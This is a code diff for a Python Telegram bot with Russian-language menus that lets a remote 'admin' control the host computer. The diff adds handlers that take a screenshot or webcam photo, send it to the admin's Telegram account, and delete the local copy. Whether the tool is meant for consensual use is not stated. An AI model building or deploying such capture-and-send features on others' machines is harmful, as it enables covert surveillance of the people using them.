@@ -195,12 +195,12 @@ def secondary_main(token, id_admin, turn_on):#всегдда проверка н
 
     
 def main(token, id_admin, turn_on):    
-    global sound_stat,text_speach, text_window
+    global sound_stat,text_speach, text_window, text_menu, file_path, cam_path, screen_path
     
     #system variables
     file_path=os.path.dirname(os.path.realpath(__main__.__file__))#link to startup
-    cam_path=f"{file_path}\screen.png"
-    screen_path=f"{file_path}\cam.png"
+    cam_path=f"{file_path}\cam.png"
+    screen_path=f"{file_path}\screen.png"
     try:
         os.remove(cam_path)#проверка и удаление фотографий
     except:
@@ -294,32 +294,6 @@ def main(token, id_admin, turn_on):
                 bot.send_message(id_admin, 'Вы ввели не число! Попробуйте ещё раз', reply_markup=markup_functional)
                 sound_stat=False
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-                
         elif message.text.lower() == "вывод текста🗣💌" or message.text.lower() == "вывод текста":
             markup_exit_and_choise = ReplyKeyboardMarkup(resize_keyboard=True)
             btn1 = KeyboardButton("Вывод текста в окно")
@@ -377,7 +351,46 @@ def main(token, id_admin, turn_on):
                     bot.send_message(id_admin, 'Возникла проблема! Попробуйте ещё раз', reply_markup=markup_functional)
             text_menu==False
             text_speach=False
-            text_window=False                
+            text_window=False
+
+            
+        elif message.text.lower() == "скриншот📟" or message.text.lower() == "скриншот":
+            try:
+                img = ImageGrab.grab()
+                img.save(screen_path)
+                time.sleep(1)
+                photo = open(screen_path, 'rb')
+                bot.send_photo(id_admin, photo)
+                photo.close()
+                try:
+                    os.remove(screen_path)
+                except Exception as a:
+                    print(a)
+            except:
+                bot.send_message(id_admin, 'Возникла проблема! Попробуйте ещё раз', reply_markup=markup_functional)
+
+
+        elif message.text.lower() == "веб-камера📸" or message.text.lower() == "веб-камера":
+            try:
+                cap = cv2.VideoCapture(0)
+                for i in range(30):
+                    cap.read()   
+                ret,frame = cap.read()
+                cv2.imwrite(cam_path, frame)   
+                cap.release()
+                time.sleep(1)
+                photo_2 = open(cam_path, 'rb')
+                bot.send_photo(id_admin, photo_2)
+                photo_2.close()
+                try:
+                    os.remove(cam_path)
+                except Exception as a:
+                    print(a)
+            except:
+                bot.send_message(id_admin, 'Возникла проблема! Причиной может быть отсутствие камеры на Вашем устройстве... Попробуйте ещё раз', reply_markup=markup_functional)
+
+
+
         ######################################################################################################
         elif message.text.lower() == "работа с файлами📁" or message.text.lower() == "работа с файлами":
             markup = ReplyKeyboardMarkup(resize_keyboard=False)
